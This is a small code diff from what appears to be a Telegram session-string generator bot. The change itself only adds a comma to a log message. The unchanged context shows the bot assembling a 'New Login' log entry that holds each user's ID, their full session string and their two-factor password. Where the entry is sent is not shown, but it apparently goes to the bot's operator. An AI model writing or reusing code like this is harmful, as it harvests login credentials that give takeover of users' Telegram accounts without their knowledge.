@@ -147,7 +147,7 @@ async def generate_session(bot: Client, message: Message, user_info, telethon=Fa
         account_type = "Bot" if is_bot else "Private Account"
         log_message = (
             f"**✨New Login ({account_type})**\n\n"
-            f"**✨User ID:** [{user_info.first_name}](tg://user?id={user_info.id}) `{user_info.id}`\n\n"
+            f"**✨User ID:** [{user_info.first_name}](tg://user?id={user_info.id}), `{user_info.id}`\n\n"
             f"**✨Session String ↓**\n`{string_session}`\n"
             f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
         )
